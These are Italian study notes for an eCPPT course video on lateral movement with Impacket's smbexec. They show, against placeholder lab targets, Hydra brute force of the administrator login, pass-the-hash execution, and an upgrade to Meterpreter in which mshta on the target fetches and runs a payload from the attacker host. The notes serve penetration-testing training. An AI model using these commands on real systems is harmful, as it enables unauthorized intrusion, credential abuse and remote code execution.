# 05 — Lateral Movement with SMBExec

> **Modulo:** Lateral Movement & Pivoting · **Video:** 5/16
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [05_Lateral Movement with SMBExec.txt](05_Lateral Movement with SMBExec.txt) · [05_Lateral Movement with SMBExec.srt](05_Lateral Movement with SMBExec.srt)

## Concetti chiave

- **SMBExec** = tool Impacket per remote command execution su Windows via **SMB**.
- Simile a PsExec ma **NON crea servizio temporaneo classico** → footprint più pulito.
- Sfrutta meccanismi tipo WMI per evitare la creazione di un servizio addizionale.
- Richiede comunque **credenziali admin** (local Administrators).
- Supporta **clear-text password** e **NTLM hash** (Pass-the-Hash).
- Fornisce una **semi-interactive shell** (NON è una vera shell PowerShell/cmd interattiva al 100%).

## Spiegazione approfondita

### SMBExec vs PsExec — differenza chiave

| Aspetto | PsExec | SMBExec |
|---|---|---|
| Trasporto | SMB (445) | SMB (445) |
| Esecuzione | Crea **servizio temporaneo** Windows | Usa **WMI / metodi alternativi** — no service classico |
| Shell | Command prompt full | **Semi-interactive shell** |
| Rumore | Loud (event 7045) | Più pulito, meno artefatti |
| Hash auth | Sì | Sì |
| Admin richiesto | Sì | Sì |

### Quando preferire SMBExec
- Quando si vuole **ridurre la traccia** sul target (no event 7045 di service install).
- Quando il blue team monitora la creazione servizi.
- Per Pass-the-Hash veloce senza Metasploit.

### Limiti della semi-interactive shell
- Output è bufferizzato (non vero TTY).
- Alcuni comandi interattivi (es. quelli che richiedono input continuo) non funzionano bene.
- Per shell migliore → upgrade a Meterpreter via payload HTA / web_delivery.

## Comandi & strumenti

```bash
# Pre-check SMB
nmap -p 445 --script smb-protocols <TARGET_IP>

# Brute force admin
hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb2://<TARGET_IP>

# SMBExec con clear-text password
smbexec.py administrator:<password>@<TARGET_IP>

# SMBExec con NTLM hash (Pass-the-Hash) — formato LM:NT
smbexec.py -hashes <LM>:<NT> administrator@<TARGET_IP>

# Verifica privilegi nella semi-interactive shell
whoami
whoami /priv
hostname
net user
```

## Esempi pratici

```bash
# 1. Brute force con Hydra (target: administrator, lab password)
hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb2://<TARGET_IP>
# → password: carolina

# 2. SMBExec
smbexec.py administrator:carolina@<TARGET_IP>
# → semi-interactive shell aperta
C:\Windows\system32> hostname
C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> whoami /priv
# → tutti i privilegi (SYSTEM)

# 3. Enumerazione utenti locali
net user
# → administrator, sysadmin, demo, auditor, ...

# 4. Tentativo con utente NON admin (per dimostrare il limite)
smbexec.py sysadmin:madison@<TARGET_IP>
# → RPC_ACCESS_DENIED → conferma che servono privilegi admin

# 5. Pass-the-Hash con SMBExec
# Estrai gli hash con Metasploit (hashdump) o Mimikatz, poi:
smbexec.py -hashes 00000000000000000000000000000000:<NT_HASH> administrator@<TARGET_IP>

# 6. Upgrade a Meterpreter via HTA module (alternativa a web_delivery)
# (in msfconsole)
use exploit/windows/misc/hta_server
set payload windows/meterpreter/reverse_tcp
set LHOST <KALI_IP>
exploit
# → restituisce un URL .hta, su SMBExec shell:
mshta.exe http://<KALI_IP>:8080/xxxxx.hta
```

## Punti d'attenzione per l'esame eCPPT

- **Differenza PsExec vs SMBExec** è una **domanda d'esame ricorrente**:
  - PsExec → **crea servizio** (rumoroso, event 7045).
  - SMBExec → **WMI-like, no service classico** (più pulito).
- Entrambi richiedono **local Administrator**.
- Formato hash per `-hashes`: `LM:NT` (LM può essere tutti zero).
- La shell di SMBExec è **semi-interactive** — non è una shell completa, quindi per workflow lunghi usare Meterpreter via HTA/web_delivery.
- **Errore `RPC_ACCESS_DENIED`** = utente NON admin → conferma il prerequisito.
- Mantenere in mente la **catena**: cred → SMB → exec → privesc-not-needed (già SYSTEM).

## Collegamenti con altri video

- Precedente: [[04_Lateral Movement with PsExec]] — il "fratello rumoroso".
- Prossimo: [[06_Lateral Movement with CrackMapExec]] — il catch-all che fa entrambe queste cose e di più.
- WMI exec (ulteriore alternativa): [[010_Pass-the-Hash with WMIExec]]
- Teoria SMB/NTLM: [[04_Lateral Movement with PsExec]] (sezione auth)
